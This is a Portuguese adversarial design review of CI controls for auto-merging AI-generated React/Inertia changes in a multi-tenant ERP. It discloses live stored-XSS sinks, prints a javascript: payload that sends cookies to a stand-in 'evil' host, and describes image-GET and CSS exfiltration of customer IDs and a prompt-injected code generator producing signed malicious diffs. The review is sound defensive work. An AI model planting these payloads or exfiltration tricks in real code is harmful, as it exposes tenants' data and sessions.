---
date: "2026-06-17"
topic: "Adversário R2 — atacar os 5 controles da cura do loop handoff zero-paste; auto-merge ainda inseguro?"
type: session
authors: [C]
related_adrs: [0269-auto-deploy-on-merge, 0261-skip-as-pass-required-checks]
---

# [AH] Rodada 2 — Atacando a Cura

Premissa: [CL] construiu os 5 controles **exatamente como especificados** e promoveu
`tier0-guards`/`multi-tenant-gate` a required. Missão: quebrar de novo, ancorado em
`arquivo:linha`/gate real. Tudo abaixo foi re-verificado no repo nesta rodada.

## Re-verificação dos fatos de base (rodada 2, nesta sessão)

- `multi-tenant-gate.yml:57` — regex de detecção cobre SÓ
  `Modules/.*/Http/Controllers/`, `AdminSidebarMenu.php`, `HandleInertiaRequests.php`,
  o teste e o próprio workflow. **`.tsx` cai no `else` (linha 60-62) = SKIP-AS-PASS.**
  Promover a required NÃO adiciona cobertura — só garante que o verde-vazio reporta.
- `deploy.yml:13-19` — push em main publica em prod; `paths-ignore` = `memory/**`,
  `**.md`, `prototipo-ui/**`, `cowork-inbox/**`. **`resources/js/**` NÃO está lá.**
  Deploy faz `migrate --force` (`deploy.yml:254`) sem humano. O smoke (`deploy.yml:372-397`)
  só valida HTTP 200/302 em `/login` (**página pública, não-autenticada**) + hash de bundle.
  Cego a render autenticado, cross-tenant, XSS, lógica.
- Branch protection (`gh api .../branches/main/protection`, lido agora):
  `enforce_admins: true`, **17 required checks**, mas
  **`required_approving_review_count: 0`**. Ou seja: hoje o merge já é "gate-only,
  zero olho humano obrigatório". Auto-merge não muda o *modelo de confiança* — só
  remove o último humano voluntário (o clicador do botão).
- `UiDeterministicScorer.php:137-194` — regex binário (cor/nativo/localStorage/lucide/
  emoji/status-fill). **Não tem regex algum** para `router.*`, `useForm`, `only:`,
  `dangerouslySetInnerHTML`, `fetch`, `usePage().props`, `<Link href`. O lint
  render-only do controle 1 **não existe** — é a-construir.
- `files_json` como gate/scope-construct: **0 ocorrências no repo** (grep). Existe só
  como prop de dados dentro de `.tsx`. Controle 2 é a-construir.
- `a11y-axe-gate.yml:14-26` — path-scoped a `Components/ui/**`; jsdom não vê contraste.
  Pages não passam por axe.

### Achado novo (não estava na rodada 1) — o `.tsx` JÁ vaza hoje, com 17 gates verdes

- `Essentials/Messages/Index.tsx:212` — `dangerouslySetInnerHTML={{ __html: m.message }}`
  onde `m.message` é **mensagem digitada pelo usuário, por-tenant**, sem sanitização.
  **Stored-XSS vivo** que já passou pelos 17 required checks. Prova material: os gates
  atuais NÃO mordem XSS em `.tsx`. Tier0 required não toca isso.
- O mesmo padrão renderiza conteúdo de DB em `Todo/Show.tsx:327` (`todo.description`),
  `Knowledge/{Index,Show}.tsx` (`content`), `Site/{Page,BlogPost}.tsx` (`content`),
  `TransactionPayment/Show.tsx:119` (`contact.contact_address`).
- **A "alternativa segura" também vaza.** O parser custom de markdown da Jana
  (`Cockpit.tsx:566-573`), louvado no comentário como substituto do dSIH "PROIBIDO",
  injeta `linkMatch[2]` direto em `href={...}` **sem validar scheme**. Markdown
  `[clica](javascript:fetch('//evil/'+document.cookie))` vira `<a href="javascript:...">`
  clicável. Qualquer lint que premie "usa parser custom em vez de dSIH" engole isto.
- **Conflito de política no próprio canon:** `Jana/Chat.charter.md:85` e
  `Cockpit.charter.md:130` PROÍBEM dSIH (XSS); `Essentials/Knowledge/Index.charter.md:28`
  PERMITE ("confiamos source autor admin"). Não existe um booleano global "dSIH proibido"
  para o lint ancorar — a política é por-tela e inconsistente.

---

## Veredito por controle

### Controle 1 — Lint render-only por conteúdo do diff → **FURADO**

A premissa do controle é uma **denylist de tokens perigosos**. Denylist em superfície
Turing-completa (TS/JSX) é estruturalmente furável. Provas, todas com efeito real:

1. **O `href` é o vetor, não o `router`.** A lista proposta (`router.*`/`useForm`/`only:`/
   `data:`/`dSIH`/`fetch`/`query`) não inclui `href`. Mas `Cockpit.tsx:530` e `:570`
   já provam que `href={variável}` controla navegação e (com `javascript:`) executa.
   Um diff "render-only" pode adicionar `<a href={props.algumCampo}>` sem tocar
   nenhum token da lista. `<Link href={...}>` do Inertia idem.
2. **Re-derivação de prop existente.** `usePage().props.x` já está no componente; o diff
   só **muda como x é usado** (ex.: passa `contact.cpf` de um `title=` para dentro de um
   `<img src={'/track?d='+contact.cpf}/>`). Zero tokens novos da denylist; exfiltra PII
   por GET de imagem. `data:`/`fetch` não aparecem — `<img src>` resolve o request.
3. **Mudança de `key`/condicional troca branch de fetch do PAI.** O `.tsx` filho é
   "render-only", mas inverter um `condicao ? <A/> : <B/>` faz o pai montar um efeito
   que dispara `router.reload({only:[...]})` com escopo maior. O efeito colateral mora
   em arquivo não-tocado; o lint olha só o diff do filho.
4. **CSS que revela dado.** Remover `className="hidden"` de um campo PII (ex.: coluna
   "documento" numa tabela que o backend já manda mas a UI escondia) expõe o dado.
   É só uma string de classe — nenhum token perigoso. `style={{background:`url(/x?${cpf})`}}`
   exfiltra via CSS sem `fetch`.
5. **Import de barrel/helper.** `import { fmt } from '@/lib/util'` onde `util/index.ts`
   re-exporta um helper que faz `fetch`. Render-only no diff visível; efeito no grafo.

**Spec de endurecimento (a denylist COMPLETA que o lint precisaria — e ainda fura):**
proibir, nas linhas `+`, AST-level (não regex): `router.*`, `useForm`, `useFormContext`,
`only:` em options, `dangerouslySetInnerHTML`, `fetch(`, `XMLHttpRequest`, `axios`,
`navigator.sendBeacon`, `WebSocket`, `EventSource`, `import(` dinâmico, `eval`, `Function(`,
`href={<expr>}` (qualquer href não-literal), `src={<expr>}` (img/iframe/script/source),
`action={<expr>}`, `formAction`, `style={<expr com template/var>}`, `localStorage`,
`sessionStorage`, `document.*`, `window.*`, `URL(`, `new Image(`, qualquer `on*` handler
com corpo não-trivial, mudança em `key=`, mudança em qualquer ternário/`&&` no JSX,
QUALQUER import novo, QUALQUER prop passada a um componente filho que não seja string
literal. **Conclusão:** essa lista, levada ao fim lógico, proíbe ~tudo que um `.tsx` faz —
vira "nenhum `.tsx` é auto-mergeável", que é o mesmo que dizer que `.tsx` é inelegível.
E mesmo assim o furo #3 (efeito no pai) escapa, porque o gate olha o diff, não o grafo de
montagem. Denylist não fecha; só uma **allowlist sintática minúscula** (ver
Recomendação) fecha — e ela exclui praticamente toda tela real.

### Controle 2 — scope-guard `files_json` → **MITIGA-PARCIAL** (limita *quais* arquivos, não *o que eles fazem*)

Confirmado que não existe hoje (`scope-guard.yml` é controller-vs-`SCOPE.md` via
`bin/check-scope.php`; nenhum `files_json`). Mesmo construído:

1. **Conteúdo dentro do arquivo permitido não é limitado.** Um `.tsx` listado no
   manifesto pode mudar um **Context global** (`AppContext`, tema, `usePage` shared
   props) consumido por telas **não-listadas**. O blast radius extrapola o manifesto
   sem tocar arquivo fora dele. Real: `resources/js/Components/shared/DataTable.tsx`
   é consumido por dezenas de Pages; "tocar só DataTable" é tocar todas.
2. **Barrel re-export.** Editar `lib/index.ts` (permitido) muda o que dezenas de
   importadores recebem. O manifesto vê 1 arquivo; o efeito atinge N.
3. **Race entre handoffs.** 2 handoffs assinam manifestos que tocam o mesmo arquivo;
   merge intercalado produz um estado que nenhum dos dois validou. O scope-guard
   valida cada PR isolado, não a interseção pós-merge.
4. **Arquivo gerado por build.** Manifesto cobre fonte; o bundle publicado
   (`deploy.yml` build no runner) é derivado — um `postinstall`/plugin Vite malicioso
   num `package.json` "permitido" injeta no bundle sem aparecer no diff de `.tsx`.

**Spec de endurecimento:** manifesto deve listar arquivos **E** declarar "blast surface"
(nenhum arquivo do PR pode ser importado por arquivo fora do manifesto — exige análise de
grafo de imports reverso, ex. `madge`/`dependency-cruiser` no CI, falhando se um arquivo
tocado tem importador externo não-listado). Proibir edição de qualquer Context provider,
`shared/**`, `lib/**`, barrel `index.ts`, `package.json`, `vite.*.config` em PR
auto-merge. Lock pessimista por-arquivo entre handoffs ativos (serializa). Mesmo assim,
**não limita semântica** — só topologia. Por isso MITIGA, não RESOLVE.

### Controle 3 — Assinatura nonce + exp + bind → **FURADO** (resolve transporte; não resolve qualidade nem origem comprometida)

A assinatura prova **autenticidade + integridade + frescor**. Não prova **que o conteúdo
é seguro**. Ataques:

1. **O secret vive no pipeline de export do Cowork — fora do controle de [W].** Cowork
   comprometido (ou um prompt-injection no [CC] que GERA o handoff) produz conteúdo
   malicioso **legitimamente assinado**. A assinatura é válida; o payload é hostil.
   Garbage-in-signed = garbage-out-merged.
2. **Assinatura não agrega QUALIDADE.** Ela responde "veio do Cowork e não foi
   adulterado", nunca "este `.tsx` não vaza tenant". Confundir as duas é o erro de
   categoria que faz a cura parecer suficiente.
3. **Replay dentro da janela.** Nonce de uso único protege re-submissão; mas se exp=10min
   e o atacante intercepta+re-submete em 30s com nonce ainda não-consumido (race entre
   verificação e gravação do nonce), passa. Exige nonce store atômico (CAS), não "checa
   depois grava".

**Spec de endurecimento:** secret de assinatura em HSM/OIDC short-lived, NUNCA em env do
Cowork; assinatura cobre hash do diff canonicalizado + base SHA + lista de paths + TTL ≤
5min; nonce store com compare-and-set atômico; **e — crítico — declarar explicitamente
que a assinatura é condição NECESSÁRIA e jamais SUFICIENTE para merge.** Mesmo perfeita,
não desbloqueia auto-merge sozinha.

### Controle 4 — Quarentena/canário antes do deploy → **MITIGA-PARCIAL** (atrasa; não decide)

1. **Quem valida na quarentena?** Se forem os mesmos gates cegos (os 17 + tier0), a
   quarentena só **adia** o merge ruim — o conjunto de coisas que passa verde é
   idêntico. Atraso ≠ detecção.
2. **Canário em qual tenant?** O único cliente real ativo é biz=4 (Larissa/ROTA LIVRE).
   Canário "num tenant real" = **expor cliente pagante ao bug**. Inaceitável para um ERP
   onde vazar entre tenants é o pior bug (CLAUDE.md princípio 6, Tier 0 IRREVOGÁVEL).
3. **Quem promove canário→prod, e com base em quê?** Auto-promote por "sem erro 500 em
   N min" não detecta XSS armazenado, vazamento silencioso de PII, nem lógica errada que
   não derruba o processo. Re-introduz o problema do controle 1 no estágio de promoção.

**Spec de endurecimento:** canário SÓ em **tenant sintético** (biz fixture com dados
fabricados, zero PII real), nunca biz≥1 produtivo; gate de promoção precisa de um
**oráculo que os 17 atuais não têm** (ex.: smoke autenticado que faz login em 2 tenants
sintéticos e assertа que tenant A nunca vê linha de tenant B — isso é construível e seria
o gate de cross-tenant que falta hoje); promoção automática só se o oráculo cross-tenant +
um axe/contraste browser-real + um scan de XSS em DOM renderizado passarem. Sem esse
oráculo, quarentena é teatro. **Com** ele, vira o componente mais valioso da cura — mas
note que aí o trabalho está no oráculo, não na quarentena.

### Controle 5 — Digest fail-closed com SLA → **FURADO como habilitador de auto-merge** (vira rubber-stamp ou pressão de afrouxar)

1. **Solo-founder + fadiga de digest = rubber-stamp.** "Pausa se [W] não ler" assume que
   ler ≈ revisar. [W] sozinho, lendo N digests/dia no piloto automático, clica "ok". O
   controle mede *leitura*, não *compreensão*. Falsa sensação de supervisão.
2. **Fail-closed cria pressão de afrouxar.** Quando o loop trava trabalho legítimo (digest
   não lido numa sexta à noite), a tentação operacional é encurtar o SLA ou auto-ack.
   Controle de segurança que atrapalha trabalho legítimo tende a ser desligado — é um
   anti-padrão conhecido. SLA curto = ruído (trava à toa); SLA longo = janela de dano
   (merge ruim já está em prod antes de [W] ler).
3. **Digest é detecção POST-merge.** Se o objetivo é auto-merge, o digest chega depois do
   `deploy.yml` já ter rodado `migrate --force` em prod. Fail-closed do *próximo* loop não
   desfaz o dano do *atual*.

**Spec de endurecimento:** digest serve para **observabilidade**, não como gate de
segurança. Se for gate, precisa ser PRÉ-merge (humano-no-merge — exatamente o que se quer
evitar) e exigir um ack que prove leitura semântica (ex.: responder uma pergunta gerada do
diff). Isso é mais pesado que o 1-clique da Fase 0. Como habilitador de auto-merge: não
serve.

---

## Cenário end-to-end de dano que AINDA passa com os 5 ligados

Cenário **"PII cross-tenant por re-derivação de prop, sob todos os 5 controles"**:

1. **[CC]/Cowork gera** um handoff que toca **só** `resources/js/Pages/Cliente/Index.tsx`
   (uma tela real, hoje com `router.reload({only:['rows']})`). Manifesto `files_json` lista
   exatamente esse 1 arquivo. **Controle 2 passa** (1 arquivo, sem importador externo novo).
2. O diff **não adiciona** nenhum token da denylist render-only. Ele apenas: (a) muda um
   `<td>{row.nome}</td>` para `<td title={row.nome}><img src={'/avatar?d='+row.documento}/></td>`
   e (b) inverte um ternário de coluna que faz o componente pai pedir `only:['rows','ledger']`
   em vez de `only:['rows']` — trazendo um payload com mais campos. Nenhum `router.`,
   `fetch`, `useForm`, `dSIH`, `data:` nas linhas `+`. **Controle 1 passa.**
3. O handoff é **assinado pelo Cowork com nonce+exp+bind válidos** — porque o Cowork
   gerou esse conteúdo de boa-fé (ou foi prompt-injectado). **Controle 3 passa**: a
   assinatura atesta origem, não segurança.
4. PR auto-merge → **quarentena/canário em biz=4 (único tenant real)** — ou em tenant
   sintético sem dados cruzados que exercitem o caso. O `<img src=/avatar?d=...>` dispara
   um GET com o documento do cliente para um endpoint de tracking; **nenhum erro 500**, o
   smoke (`deploy.yml:372`) vê `/login` = 200, hash de bundle mudou (esperado). **Controle 4
   promove** (oráculo de cross-tenant não existe nos 17 gates; o exfil é via GET de imagem,
   invisível ao smoke).
5. **Digest chega depois.** [W] lê "1 PR de UI Cliente, gates verdes, canário OK" e dá ack.
   **Controle 5 não pausa nada** — o loop seguinte fica livre; o dano do atual já foi a prod
   via `deploy.yml` (`migrate --force` nem precisou; foi só bundle).

Resultado: documento de cliente exfiltrado por GET, e/ou (variante) `m.message` com
`<img src=x onerror=...>` armazenado virando XSS por-tenant (réplica do que **já existe**
em `Messages/Index.tsx:212`). **Todos os 5 controles verdes.** O furo é estrutural: 4 dos
5 controles validam **proveniência/topologia/tempo**; nenhum tem um **oráculo semântico de
"esta tela não vaza dado nem executa script hostil"**, e o único que poderia (controle 4)
depende de um oráculo cross-tenant que **não está nos 17 required hoje**.

---

## Posição: humano-no-merge é ESTRUTURAL para este repo

Para um **ERP multi-tenant, solo-founder, com deploy automático em push-to-main e
`required_approving_review_count: 0`**, os 5 controles **NÃO earned auto-merge** de `.tsx`.
Razões, em ordem de peso:

1. **O modelo de confiança já é gate-only.** Como `enforce_admins:true` +
   `reviews:0`, o botão de merge humano é hoje a **única** etapa de cognição não-mecânica.
   Removê-lo entrega a decisão final a um conjunto de gates que **comprovadamente não
   morde XSS/cross-tenant em `.tsx`** (`Messages/Index.tsx:212` está em prod, verde).
2. **A superfície é Turing-completa e data-driving.** `.tsx` no Inertia dirige
   `router.reload`, `href`, props para Context global. Nenhuma denylist fecha; só uma
   allowlist minúscula — que exclui telas reais.
3. **O blast radius é prod imediato + cliente real único.** `deploy.yml` publica no merge;
   o único tenant ativo é pagante. O custo de um falso-verde é vazamento de PII de cliente
   real, que o CLAUDE.md classifica como o pior bug possível (Tier 0 IRREVOGÁVEL).
4. **Os controles validam o canal, não o conteúdo.** Assinatura (origem), files_json
   (topologia), nonce/exp (tempo), digest (observabilidade post-hoc). Só a quarentena
   PODERIA validar conteúdo — e só se ganhar um oráculo semântico que hoje não existe.

A Fase 0 (1-clique de [W]) **é o ótimo real** enquanto o oráculo semântico não existir:
custa ~5s de [W], e é o único ponto onde um humano pode pegar o furo #2/#3 do controle 1
("isso não devia mexer no documento do cliente"). Não é cerimônia — é o último oráculo
semântico disponível.

---

## Recomendação de meio-termo (o que PODE ser auto-mergeado com segurança real)

Auto-merge é defensável **apenas** para mudanças **comprovadamente sem efeito de runtime**,
sob **allowlist sintática ultra-restrita** (não denylist) + canário em **tenant sintético**.
Concretamente, um PR é auto-merge-elegível SOMENTE se TODAS valerem:

1. **Paths:** toca apenas `**.md`, `prototipo-ui/**`, `cowork-inbox/**` (já em
   `deploy.yml` `paths-ignore` — ou seja, **não dispara deploy**), OU `.tsx`/`.css` que
   passem (2)-(5).
2. **Allowlist AST por `.tsx`:** o diff `+`/`-` só pode conter, via parser (não regex):
   - mudanças em **string literais** dentro de JSX text/atributos cujo nome esteja numa
     allowlist de "cosméticos" (`className` com classes de uma allowlist de tokens DS,
     `aria-label`, texto entre tags);
   - **proibido** qualquer mudança em: expressão `{...}` em atributo, `href`/`src`/`action`,
     handlers `on*`, ternário/`&&` no JSX, `key`, imports, props não-literais a filhos,
     hooks, `style`. Qualquer um → inelegível, vai pra 1-clique [W].
   Isto cobre o caso de valor real (ajuste de copy/spacing/cor-token) e **nada além**.
3. **Diff-allowlist de classes CSS:** só transições entre tokens DS conhecidos
   (cruzar com baseline de `Conformance · cor-crua` + `UI Lint`); proibir adicionar/remover
   `hidden`/`sr-only`/`display:none` (controle anti-revelação-de-dado).
4. **Oráculo cross-tenant em tenant sintético** (a-construir; é o investimento que vale):
   smoke autenticado pós-deploy-canário que loga em 2 biz fixtures e assertа isolamento;
   sem ele, nem o cosmético promove sozinho — fica em staging até [W].
5. **Assinatura (controle 3) como necessária, nunca suficiente** — gate de admissão, não
   de aprovação.

Tudo que cair fora dessa allowlist (= qualquer `.tsx` que mude comportamento, dados ou
navegação) **permanece humano-no-merge (Fase 0, 1-clique)**. O esforço de [CL] rende mais
construindo **o oráculo cross-tenant em tenant sintético** (item 4) — que também fecharia o
furo vivo de `Messages/Index.tsx:212` e seria o primeiro gate a realmente morder em `.tsx` —
do que construindo os 5 controles, que validam o canal e deixam o conteúdo passar.

## Resumo executivo (vereditos)

| Controle | Veredito | Por quê (1 linha) |
|---|---|---|
| 1 Lint render-only | **FURADO** | denylist em JSX Turing-completo; `href`/CSS/efeito-no-pai escapam |
| 2 files_json | **MITIGA-PARCIAL** | limita topologia, não semântica; Context/barrel/race furam |
| 3 Assinatura nonce+exp | **FURADO** (p/ auto-merge) | atesta origem, não qualidade; secret no Cowork fora de [W] |
| 4 Quarentena/canário | **MITIGA-PARCIAL** | atrasa, não decide; sem oráculo semântico + canário só sintético |
| 5 Digest fail-closed | **FURADO** (p/ auto-merge) | rubber-stamp solo + detecção post-merge + pressão de afrouxar |

**Veredito global:** humano-no-merge é **estrutural** para `.tsx` neste ERP. Auto-merge só
para cosmético-comprovado sob allowlist AST + canário sintético. O ROI de [CL] está no
**oráculo cross-tenant sintético**, não nos 5 controles de canal.
